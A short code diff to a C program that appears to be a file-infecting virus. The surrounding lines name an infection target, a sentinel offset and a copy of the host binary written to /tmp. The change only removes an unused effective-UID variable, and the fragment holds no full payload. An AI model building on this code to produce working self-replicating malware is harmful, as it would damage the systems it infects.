@@ -17,7 +17,7 @@ int main(int argc, char** argv){
 	int thisFileFd, tmpHostFd, toInfectFd;
 	int i;
 	off_t sentinelOff;
-	uid_t ruid, euid;
+	uid_t ruid;
 	char tmpHostFileName[30];
 	unsigned char buf;
 	struct stat arg1Stat;
@@ -26,7 +26,6 @@ int main(int argc, char** argv){
 	//copy host to temp file
 	thisFileFd = open(argv[0], O_RDONLY);
 	ruid = getuid();
-	euid = geteuid();
 
 	sprintf(tmpHostFileName,"/tmp/host.%d", ruid);
 	tmpHostFd = open(tmpHostFileName, O_WRONLY|O_CREAT|O_EXCL, S_IXUSR);
